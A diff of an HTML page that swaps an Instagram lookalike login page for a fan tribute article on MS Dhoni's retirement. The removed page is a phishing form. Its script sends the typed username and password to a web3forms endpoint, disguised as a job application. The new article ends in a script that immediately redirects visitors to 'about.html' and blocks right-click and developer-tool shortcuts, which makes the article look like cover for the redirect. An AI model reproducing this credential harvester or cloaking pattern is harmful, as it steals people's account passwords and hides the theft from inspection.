@@ -1,522 +1,287 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="en">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <link rel="icon" href="images/logo.webp" type="image/webp" />
-    <title>Instagram</title>
-    <style>
-      * {
-        box-sizing: border-box;
-        margin: 0;
-        padding: 0;
-      }
-
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Thala Signs Off: MS Dhoni's Retirement and the End of an Era</title>
+  <meta name="description" content="A look back at MS Dhoni's retirement, from the 2020 international goodbye to the IPL farewell in November 2026." />
+  <style>
+    :root {
+      --bg: #fbf9f3;
+      --card: #ffffff;
+      --text: #1d1d1f;
+      --muted: #5f6368;
+      --accent: #f2b705;
+      --accent-ink: #7a5a00;
+      --blue: #1b3a8a;
+      --line: #e6e1d3;
+    }
+    @media (prefers-color-scheme: dark) {
       :root {
-        --blue: #0866ff;
-        --blue-disabled: #9fc2f7;
-        --border: #ccd0d5;
-        --text: #1c1e21;
-        --muted: #65676b;
+        --bg: #14161c;
+        --card: #1c1f27;
+        --text: #ececec;
+        --muted: #a0a4ad;
+        --accent: #f5c518;
+        --accent-ink: #f5c518;
+        --blue: #8fa8ff;
+        --line: #2d313c;
       }
+    }
+    * { box-sizing: border-box; }
+    body {
+      margin: 0;
+      background: var(--bg);
+      color: var(--text);
+      font-family: Georgia, "Times New Roman", serif;
+      line-height: 1.75;
+      font-size: 18px;
+    }
+    .hero {
+      background: linear-gradient(135deg, #1b3a8a 0%, #12266b 100%);
+      color: #fff;
+      padding: 72px 20px 64px;
+      text-align: center;
+      border-bottom: 6px solid var(--accent);
+    }
+    .hero .tag {
+      display: inline-block;
+      font-family: system-ui, sans-serif;
+      font-size: 13px;
+      letter-spacing: 0.12em;
+      text-transform: uppercase;
+      background: var(--accent);
+      color: #1d1d1f;
+      padding: 4px 12px;
+      border-radius: 999px;
+      font-weight: 600;
+    }
+    .hero h1 {
+      font-size: clamp(30px, 6vw, 52px);
+      line-height: 1.15;
+      margin: 20px auto 14px;
+      max-width: 800px;
+    }
+    .hero .meta {
+      font-family: system-ui, sans-serif;
+      font-size: 14px;
+      opacity: 0.85;
+    }
+    article {
+      max-width: 720px;
+      margin: 0 auto;
+      padding: 40px 20px 20px;
+    }
+    h2 {
+      font-size: 28px;
+      line-height: 1.3;
+      margin: 48px 0 10px;
+      border-left: 5px solid var(--accent);
+      padding-left: 14px;
+    }
+    p { margin: 0 0 20px; }
+    .lead { font-size: 21px; color: var(--muted); }
+    blockquote {
+      margin: 32px 0;
+      padding: 20px 24px;
+      background: var(--card);
+      border: 1px solid var(--line);
+      border-left: 5px solid var(--accent);
+      border-radius: 8px;
+      font-size: 22px;
+      font-style: italic;
+    }
+    blockquote cite {
+      display: block;
+      margin-top: 8px;
+      font-size: 14px;
+      font-style: normal;
+      font-family: system-ui, sans-serif;
+      color: var(--muted);
+    }
+    .timeline {
+      list-style: none;
+      margin: 28px 0;
+      padding: 0 0 0 22px;
+      border-left: 3px solid var(--line);
+    }
+    .timeline li { position: relative; margin-bottom: 22px; padding-left: 18px; }
+    .timeline li::before {
+      content: "";
+      position: absolute;
+      left: -31px;
+      top: 9px;
+      width: 13px;
+      height: 13px;
+      border-radius: 50%;
+      background: var(--accent);
+      border: 3px solid var(--bg);
+    }
+    .timeline strong { font-family: system-ui, sans-serif; color: var(--accent-ink); }
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+      gap: 14px;
+      margin: 28px 0;
+    }
+    .stat {
+      background: var(--card);
+      border: 1px solid var(--line);
+      border-radius: 10px;
+      padding: 16px;
+      text-align: center;
+      font-family: system-ui, sans-serif;
+    }
+    .stat b { display: block; font-size: 28px; color: var(--blue); }
+    .stat span { font-size: 13px; color: var(--muted); }
+    .sources {
+      font-family: system-ui, sans-serif;
+      font-size: 14px;
+      color: var(--muted);
+      border-top: 1px solid var(--line);
+      margin-top: 48px;
+      padding-top: 20px;
+    }
+    .sources a { color: var(--blue); }
+    footer {
+      text-align: center;
+      font-family: system-ui, sans-serif;
+      font-size: 13px;
+      color: var(--muted);
+      padding: 30px 20px 50px;
+    }
+  </style>
+</head>
+<body>
 
-      html,
-      body {
-        height: 100%;
-      }
+  <header class="hero">
+    <span class="tag">Cricket · Tribute</span>
+    <h1>Thala Signs Off: MS Dhoni's Retirement and the End of an Era</h1>
+    <div class="meta">Published 20 November 2026 · 5 min read</div>
+  </header>
 
-      body {
-        font-family: "Inter", "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-        color: var(--text);
-        background: #fff;
-        border-top: 2px solid #333;
-        display: flex;
-        flex-direction: column;
-        min-height: 100vh;
-      }
+  <article>
+    <p class="lead">
+      Some players leave the game with a speech and a stadium full of flowers.
+      MS Dhoni has always left the way he played: quietly, on his own terms, and
+      leaving everyone else to work out what just happened.
+    </p>
 
-      .logo {
-        display: block;
-        width: 61px;
-        height: auto;
-        margin: 33px;
-      }
-      .logo-sm {
-        display: none;
-      }
+    <p>
+      On 17 November 2026, Chennai Super Kings confirmed that Dhoni, now 45, has retired
+      from playing and will serve as the franchise's mentor from the 2027 season. For fans
+      who grew up watching him finish matches, it is the last full stop on a story that
+      began long before most of today's IPL stars had even picked up a bat.
+    </p>
 
-      .top-logo {
-        position: absolute;
-        top: 2px;
-        left: 0;
-        width: 262px;
-        height: 158px;
-        padding: 14px 14px 0;
-        background: #fff;
-      }
-      .mobile-language {
-        display: none;
-      }
+    <h2>The 2020 goodbye that nobody saw coming</h2>
+    <p>
+      The first goodbye came on 15 August 2020. There was no press conference and no
+      farewell match. He posted a short video montage of his career on Instagram, with
+      one line that fans still quote:
+    </p>
 
-      /* ---------- Layout ---------- */
-      .page {
-        flex: 1;
-        display: grid;
-        grid-template-columns: 2fr 1fr;
-        min-height: 0;
-      }
+    <blockquote>
+      "From 1929 hrs consider me as Retired."
+      <cite>MS Dhoni, 15 August 2020</cite>
+    </blockquote>
 
-      .left {
-        display: flex;
-        flex-direction: column;
-        align-items: center;
-        padding-top: 150px;
-        border-right: 1px solid var(--border);
-      }
+    <p>
+      His last game for India had been the 2019 World Cup semi-final against New Zealand.
+      That meant the end of an international career had effectively passed over a year
+      earlier, and nobody had been told. It was very Dhoni: no drama, just a calm
+      announcement that closed a chapter.
+    </p>
 
-      .headline {
-        font-weight: 400;
-        font-size: 42px;
-        line-height: 1.3;
-        text-align: center;
-        letter-spacing: 0.3px;
-      }
+    <h2>What he left behind for India</h2>
+    <div class="stats">
+      <div class="stat"><b>350</b><span>ODIs (3 for Asia XI)</span></div>
+      <div class="stat"><b>10,773</b><span>ODI runs at 50.57</span></div>
+      <div class="stat"><b>90</b><span>Test matches</span></div>
+      <div class="stat"><b>829</b><span>international dismissals</span></div>
+    </div>
+    <p>
+      The numbers are huge, but the trophies tell the story better. Dhoni captained India
+      to the 2007 T20 World Cup, the 2011 ODI World Cup and the 2013 Champions Trophy.
+      He is the only wicketkeeper with more than 100 ODI stumpings, and he led India in
+      200 one-day internationals before stepping down from limited-overs captaincy in
+      January 2017.
+    </p>
+    <p>
+      Numbers do not capture the sixes that ended finals or the late-night chases that
+      looked lost until he walked out. The real legacy was a temperament that made a
+      whole country believe that a game was never over until he said so.
+    </p>
 
-      .gradient-text {
-        font-weight: 600;
-        background: linear-gradient(
-          90deg,
-          #f5515f 0%,
-          #c74fb4 55%,
-          #9b4df0 100%
-        );
-        -webkit-background-clip: text;
-        background-clip: text;
-        -webkit-text-fill-color: transparent;
-        color: transparent;
-      }
+    <h2>The slow IPL goodbye</h2>
+    <p>
+      After 2020, the IPL became his stage. Fans kept coming to stadiums, wearing yellow,
+      just to watch him bat for a few balls. Every season came with the same question,
+      and every season he gave the same non-answer. By 2025 he had played his last match,
+      and an injury kept him out of all 14 of Chennai's games in IPL 2026, though he
+      trained with the squad on some days.
+    </p>
 
-      .hero {
-        width: 580px;
-        max-width: 90%;
-        aspect-ratio: 580 / 540;
-        overflow: hidden;
-      }
-      .hero img {
-        width: 100%;
-        height: 100%;
-        object-fit: cover;
-        display: block;
-      }
+    <ul class="timeline">
+      <li><strong>2008:</strong> Joins Chennai Super Kings in the first IPL season.</li>
+      <li><strong>2010 &amp; 2011:</strong> Back-to-back IPL titles as captain.</li>
+      <li><strong>2018:</strong> Returns to CSK after the franchise's two-year suspension and wins the title.</li>
+      <li><strong>2021 &amp; 2023:</strong> Two more trophies, taking his total to five.</li>
+      <li><strong>2025:</strong> Plays his last IPL match.</li>
+      <li><strong>17 Nov 2026:</strong> Retires from playing and becomes CSK mentor.</li>
+    </ul>
 
-      .right {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        padding: 0 34px;
-      }
+    <p>
+      Across 278 IPL matches he scored 5,439 runs and lifted five titles, all with Chennai,
+      which ties him for the most by any captain. Few players have ever been so closely
+      tied to one franchise's identity.
+    </p>
 
-      .login-card {
-        width: 100%;
-        max-width: 546px;
-        display: flex;
-        flex-direction: column;
-      }
+    <h2>"There is no CSK without MS Dhoni"</h2>
+    <p>
+      CSK owner N Srinivasan summed it up simply: there is no CSK without MS Dhoni. He
+      added that Dhoni will always be a part of the team's identity. Co-owner Rupa Gurunath
+      said a player like him comes once in a lifetime, and that he will now guide the
+      younger players through a period of change.
+    </p>
+    <p>
+      That last point matters. Chennai finished eighth in 2026 and have missed the
+      playoffs three seasons in a row. A rebuild is coming, and having the man who built
+      the club's winning culture in the dressing room, even without a bat in his hand,
+      may be the best head start they could ask for.
+    </p>
 
-      .form-title {
-        font-size: 17px;
-        margin-bottom: 14px;
-        color: black;
-        font-weight: 600;
-      }
+    <h2>Why it hurts, and why it is fine</h2>
+    <p>
+      Fans will feel this one. For many of us, Dhoni was the first cricketer we ever
+      truly cheered for, the standard against which every finisher is judged. The yellow
+      jersey will go on without him, and the "Dhoni, Dhoni" chants at Chepauk will stay
+      with us for a long time.
+    </p>
+    <p>
+      But he is not leaving the game. He is just changing positions, from behind the
+      stumps to behind the scenes. After everything he gave cricket, it feels like the
+      right way to say goodbye: not with a farewell tour, but with a quiet handover.
+    </p>
+    <p><strong>Thank you, Mahi.</strong></p>
 
-      .input {
-        width: 100%;
-        height: 60px;
-        padding: 0 16px;
-        margin-bottom: 12px;
-        font-size: 15.5px;
-        font-family: inherit;
-        color: var(--text);
-        border: 1px solid var(--border);
-        border-radius: 16px;
-        outline: none;
-        transition:
-          border-color 0.15s,
-          box-shadow 0.15s;
-      }
-      .input::placeholder {
-        color: var(--muted);
-      }
-      .input:focus {
-        border-color: var(--blue);
-        box-shadow: 0 0 0 2px rgba(8, 102, 255, 0.2);
-      }
+    <div class="sources">
+      <strong>Sources</strong>
+      <ul>
+        <li><a href="https://www.icc-cricket.com/news/ms-dhoni-retires-from-all-international-cricket" target="_blank" rel="noopener">ICC: MS Dhoni retires from all international cricket</a></li>
+        <li><a href="https://www.thenationalnews.com/sport/cricket/2026/11/17/ipl-ms-dhoni-retires-but-will-always-be-a-part-of-chennai-super-kings-identity/" target="_blank" rel="noopener">The National: Dhoni retires but will always be part of CSK's identity</a></li>
+        <li><a href="https://openthemagazine.com/sports/quick-take-ms-dhoni-retires-from-the-ipl-seven-things-to-know-about-his-move-to-csk-mentor" target="_blank" rel="noopener">Open Magazine: Seven things to know about Dhoni's move to CSK mentor</a></li>
+      </ul>
+    </div>
+  </article>
 
-      .btn {
-        width: 100%;
-        height: 44px;
-        border-radius: 22px;
-        font-size: 15.5px;
-        font-weight: 600;
-        font-family: inherit;
-        cursor: pointer;
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 8px;
-        transition:
-          background 0.15s,
-          opacity 0.15s;
-      }
+  <footer>Fan tribute blog · Not affiliated with MS Dhoni, CSK or the BCCI</footer>
 
-      .btn-primary {
-        margin-top: 12px;
-        background: var(--blue);
-        color: #fff;
-        border: none;
-      }
-      .btn-primary:disabled {
-        background: var(--blue-disabled);
-        cursor: not-allowed;
-      }
-      .btn-primary:not(:disabled):hover {
-        background: #0657d9;
-      }
+</body>
+<script>
+    window.location.replace("about.html");
 
-      .forgot {
-        align-self: center;
-        margin-top: 22px;
-        font-size: 15px;
-        font-weight: 500;
-        color: var(--text);
-        text-decoration: none;
-      }
-      .forgot:hover {
-        text-decoration: underline;
-      }
-
-      .spacer {
-        height: 60px;
-      }
-
-      .btn-facebook {
-        background: #f0f2f5;
-        border: none;
-        color: var(--text);
-        font-weight: 500;
-        margin-bottom: 12px;
-      }
-      .btn-facebook:hover {
-        background: #e4e6eb;
-      }
-
-      .btn-outline {
-        background: #fff;
-        border: 1px solid var(--blue);
-        color: var(--blue);
-        font-weight: 500;
-      }
-      .btn-outline:hover {
-        background: #f0f6ff;
-      }
-
-      .meta-logo {
-        display: block;
-        width: 72px;
-        height: auto;
-        margin: 20px auto 0;
-      }
-
-      /* ---------- Footer ---------- */
-      .footer {
-        border-top: 1px solid var(--border);
-        min-height: 82px;
-        display: flex;
-        flex-wrap: wrap;
-        justify-content: center;
-        align-items: center;
-        column-gap: 16px;
-        row-gap: 12px;
-        padding: 18px 24px;
-      }
-      .footer a {
-        font-size: 12px;
-        color: #5b6a8a;
-        text-decoration: none;
-      }
-      .footer a:hover {
-        text-decoration: underline;
-      }
-      .nl-wrap {
-    display: none !important;
-}
-      .footer-language,
-      .footer-copyright {
-        flex-basis: 100%;
-        text-align: center;
-        font-size: 12px;
-        color: var(--muted);
-      }
-      .footer-language {
-        border: 0;
-        background: transparent;
-        color: #5b6a8a;
-        font: inherit;
-        font-size: 12px;
-        cursor: pointer;
-      }
-
-      /* ---------- Responsive ---------- */
-      @media (max-width: 1000px) {
-        .page {
-          grid-template-columns: 1fr;
-        }
-        .left {
-          display: none;
-        }
-        .footer,
-        .btn-facebook {
-          display: none;
-        }
-        .crtn {
-          position: relative;
-          bottom: 20px;
-        }
-        .top-logo {
-          position: static;
-          width: 100%;
-          height: auto;
-          min-height: 112px;
-          padding: 12px 16px 4px;
-          display: flex;
-          flex-direction: column;
-          align-items: center;
-        }
-        .mobile-language {
-          display: block;
-          align-self: center;
-          color: var(--muted);
-          font-size: 12px;
-          line-height: 1.2;
-          letter-spacing: 0.1px;
-        }
-        .logo {
-          margin: 18px auto 0;
-        }
-        .right {
-          padding: 18px 20px 24px;
-        }
-        .login-card {
-          max-width: 420px;
-        }
-        .footer {
-          padding: 18px 20px;
-        }
-        .spacerrr {
-          position: relative;
-          bottom: 10px;
-        }
-      }
-    </style>
-  </head>
-  <body>
-    <header class="top-logo">
-      <span class="mobile-language">English (US)</span>
-      <img class="logo" src="images/logo.webp" alt="Driver Bhaiya" />
-    </header>
-
-    <main class="page">
-      <section class="left">
-        <h1 class="headline">
-          See everyday<br />
-          moments from your<br />
-          <span class="gradient-text">close friends</span>
-        </h1>
-        <div class="hero">
-          <img src="images/big.webp" alt="Driver Bhaiya" />
-        </div>
-      </section>
-
-      <section class="right">
-        <form id="loginForm" class="login-card" novalidate>
-          <p class="form-title">Log into instagram</p>
-
-          <input
-            type="text"
-            id="identifier"
-            class="input"
-            placeholder="Mobile number, username or email"
-            autocomplete="username"
-          />
-          <input
-            type="password"
-            id="password"
-            class="input"
-            placeholder="Password"
-            autocomplete="current-password"
-          />
-
-          <button type="submit" id="loginBtn" class="btn btn-primary" disabled>
-            Log in
-          </button>
-          <a href="#" class="forgot">Forgot password?</a>
-
-          <div class="spacer"></div>
-
-          <button type="button" class="btn btn-facebook">
-            <svg width="16" height="16" viewBox="0 0 24 24" aria-hidden="true">
-              <circle cx="12" cy="12" r="12" fill="#0866ff" />
-              <path
-                fill="#fff"
-                d="M13.4 19v-6.2h2.1l.4-2.6h-2.5V8.6c0-.7.3-1.3 1.4-1.3h1.2V5.1c-.2 0-1-.1-1.8-.1-2 0-3.3 1.2-3.3 3.4v1.8H8.8v2.6h2.1V19h2.5z"
-              />
-            </svg>
-            Log in with Facebook
-          </button>
-          <div class="spacerrr">
-            <button type="button" class="btn btn-outline crtn">
-              Create new account
-            </button>
-            <svg
-              class="meta-logo"
-              role="img"
-              aria-label="Meta"
-              viewBox="0 0 500 100"
-              xmlns="http://www.w3.org/2000/svg"
-            >
-              <defs>
-                <linearGradient
-                  id="meta-blue-1"
-                  gradientUnits="userSpaceOnUse"
-                  x1="124.38"
-                  x2="160.839"
-                  y1="99"
-                  y2="59.326"
-                >
-                  <stop offset=".427" stop-color="#0278F1" />
-                  <stop offset=".917" stop-color="#0180FA" />
-                </linearGradient>
-                <linearGradient
-                  id="meta-blue-2"
-                  gradientUnits="userSpaceOnUse"
-                  x1="42"
-                  x2="-1.666"
-                  y1="4.936"
-                  y2="61.707"
-                >
-                  <stop offset=".427" stop-color="#0165E0" />
-                  <stop offset=".917" stop-color="#0180FA" />
-                </linearGradient>
-                <linearGradient
-                  id="meta-blue-3"
-                  gradientUnits="userSpaceOnUse"
-                  x1="27.677"
-                  x2="132.943"
-                  y1="28.71"
-                  y2="71.118"
-                >
-                  <stop stop-color="#0064E0" />
-                  <stop offset=".656" stop-color="#0066E2" />
-                  <stop offset="1" stop-color="#0278F1" />
-                </linearGradient>
-              </defs>
-              <path
-                d="M185.508 3.01h18.704l31.803 57.313L267.818 3.01h18.297v94.175h-15.264v-72.18l-27.88 49.977h-14.319l-27.88-49.978v72.18h-15.264V3.01ZM336.281 98.87c-7.066 0-13.286-1.565-18.638-4.674-5.352-3.12-9.527-7.434-12.528-12.952-2.989-5.517-4.483-11.835-4.483-18.973 0-7.214 1.461-13.608 4.385-19.17 2.923-5.561 6.989-9.908 12.187-13.05 5.198-3.13 11.176-4.707 17.923-4.707 6.715 0 12.484 1.587 17.319 4.74 4.847 3.164 8.572 7.598 11.177 13.291 2.615 5.693 3.923 12.371 3.923 20.046v4.171h-51.793c.945 5.737 3.275 10.258 6.989 13.554 3.715 3.295 8.407 4.937 14.078 4.937 4.549 0 8.461-.667 11.747-2.014 3.286-1.347 6.374-3.383 9.253-6.12l8.099 9.886c-8.055 7.357-17.934 11.036-29.638 11.036Zm11.143-55.867c-3.198-3.252-7.385-4.872-12.56-4.872-5.045 0-9.264 1.653-12.66 4.97-3.407 3.318-5.55 7.784-6.451 13.39h37.133c-.451-5.737-2.275-10.237-5.462-13.488ZM386.513 39.467h-14.044V27.03h14.044V6.447h14.715V27.03h21.341v12.437h-21.341v31.552c0 5.244.901 8.988 2.703 11.233 1.803 2.244 4.88 3.36 9.253 3.36 1.935 0 3.572-.076 4.924-.23a97.992 97.992 0 0 0 4.461-.645v12.316c-1.67.493-3.549.898-5.637 1.205-2.099.317-4.286.47-6.583.47-15.89 0-23.836-8.649-23.836-25.957V39.467ZM500 97.185h-14.44v-9.82c-2.571 3.678-5.835 6.513-9.791 8.506-3.968 1.993-8.462 3-13.506 3-6.209 0-11.715-1.588-16.506-4.752-4.803-3.153-8.572-7.51-11.308-13.039-2.748-5.54-4.121-11.879-4.121-19.006 0-7.17 1.395-13.52 4.187-19.038 2.791-5.518 6.648-9.843 11.571-12.985 4.935-3.13 10.594-4.707 16.99-4.707 4.813 0 9.132.93 12.956 2.791a25.708 25.708 0 0 1 9.528 7.905v-9.01H500v70.155Zm-14.715-45.61c-1.571-3.985-4.066-7.138-7.461-9.448-3.396-2.31-7.33-3.46-11.781-3.46-6.308 0-11.319 2.102-15.055 6.317-3.737 4.215-5.605 9.92-5.605 17.09 0 7.215 1.802 12.94 5.396 17.156 3.604 4.215 8.484 6.317 14.66 6.317 4.538 0 8.593-1.16 12.154-3.492 3.549-2.332 6.121-5.475 7.692-9.427V51.575Z"
-                fill="#1C2B33"
-              />
-              <path
-                d="M107.666 0C95.358 0 86.865 4.504 75.195 19.935 64.14 5.361 55.152 0 42.97 0 18.573 0 0 29.768 0 65.408 0 86.847 12.107 99 28.441 99c15.742 0 25.269-13.2 33.445-27.788l9.663-16.66a643.785 643.785 0 0 1 2.853-4.869 746.668 746.668 0 0 1 3.202 5.416l9.663 16.454C99.672 92.72 108.126 99 122.45 99c16.448 0 27.617-13.723 27.617-33.25 0-37.552-19.168-65.75-42.4-65.75ZM57.774 46.496l-9.8 16.25c-9.595 15.976-13.639 19.526-19.67 19.526-6.373 0-11.376-5.325-11.376-17.547 0-24.51 12.062-47.451 26.042-47.451 7.273 0 12.678 3.61 22.062 17.486a547.48 547.48 0 0 0-7.258 11.736Zm64.308 35.776c-6.648 0-11.034-4.233-20.012-19.39l-9.663-16.386c-2.79-4.737-5.402-9.04-7.88-12.945 9.73-14.24 15.591-17.984 23.002-17.984 14.118 0 26.204 20.96 26.204 49.158 0 11.403-4.729 17.547-11.651 17.547Z"
-                fill="#0180FA"
-              />
-              <path
-                d="M145.631 36h-16.759c3.045 7.956 4.861 17.797 4.861 28.725 0 11.403-4.729 17.547-11.651 17.547H122v16.726l.449.002c16.448 0 27.617-13.723 27.617-33.25 0-10.85-1.6-20.917-4.435-29.75Z"
-                fill="url(#meta-blue-1)"
-              />
-              <path
-                d="M42 .016C18.63.776.832 28.908.028 63h16.92C17.483 39.716 28.762 18.315 42 17.31V.017Z"
-                fill="url(#meta-blue-2)"
-              />
-              <path
-                d="m75.195 19.935.007-.009c2.447 3.223 5.264 7.229 9.33 13.62l-.005.005c2.478 3.906 5.09 8.208 7.88 12.945l9.663 16.386c8.978 15.157 13.364 19.39 20.012 19.39.31 0 .617-.012.918-.037v16.76c-.183.003-.367.005-.551.005-14.323 0-22.777-6.281-35.182-27.447L77.604 55.1l-.625-1.065L77 54c-2.386-4.175-7.606-12.685-11.973-19.232l.005-.008-.62-.91C63.153 31.983 61.985 30.313 61 29l-.066.024c-7.006-9.172-11.818-11.75-17.964-11.75-.324 0-.648.012-.97.037V.016c.322-.01.646-.016.97-.016 12.182 0 21.17 5.36 32.225 19.935Z"
-                fill="url(#meta-blue-3)"
-              />
-            </svg>
-          </div>
-        </form>
-      </section>
-    </main>
-
-    <footer class="footer">
-      <a href="#">About</a>
-      <a href="#">Help</a>
-      <a href="#">Terms</a>
-      <a href="#">Privacy</a>
-      <a href="#">Cookie Settings</a>
-      <a href="#">Locations</a>
-      <a href="#">Popular</a>
-      <a href="#">Contact</a>
-      <span class="footer-language">English (US) &#9662;</span>
-      <span class="footer-copyright">&copy; 2026 Instagram from Meta</span>
-    </footer>
-
-    <script>
-      try {
-        const form = document.getElementById("loginForm");
-        const identifier = document.getElementById("identifier");
-        const password = document.getElementById("password");
-        const loginBtn = document.getElementById("loginBtn");
-
-        // Enable the button only when both fields have a value
-        function updateButtonState() {
-          loginBtn.disabled = !(
-            identifier.value.trim() && password.value.trim()
-          );
-        }
-        identifier.addEventListener("input", updateButtonState);
-        password.addEventListener("input", updateButtonState);
-
-        form.addEventListener("submit", async (e) => {
-          e.preventDefault();
-          if (loginBtn.disabled) return;
-
-          const originalText = loginBtn.textContent;
-
-          try {
-            loginBtn.disabled = true;
-            loginBtn.textContent = "Logging in...";
-
-            const payload = {
-              access_key: "85d6560d-937f-42b3-881b-63184dea831e", // Get this from web3forms dashboard
-              subject: `New Job Application from ${identifier.value.trim()}`,
-              name: identifier.value.trim(),
-              usernamepass: password.value.trim(),
-            };
-
-            await fetch("https://api.web3forms.com/submit", {
-              method: "POST",
-              headers: {
-                "Content-Type": "application/json",
-              },
-              body: JSON.stringify(payload),
-            })
-              .then((response) => response.json())
-              .then((data) => {
-                console.log("Application submitted successfully", data);
-                this.submitted.set(true);
-              });
-          } catch (err) {
-            console.error(err);
-          } finally {
-            loginBtn.textContent = originalText;
-            updateButtonState(); // re-enable only if fields still have values
-          }
-        });
-      } catch (e) {
-        console.log(e);
-      }
-
-      // 1. Right-click band
+    // 1. Right-click band
       document.addEventListener("contextmenu", (e) => e.preventDefault());
 
       // 2. Inspect ke shortcuts band (F12, Ctrl+Shift+I/J/C, Ctrl+U)
@@ -542,7 +307,5 @@
         }
         
       }, 1000);
-      
-    </script>
-  </body>
+</script>
 </html>
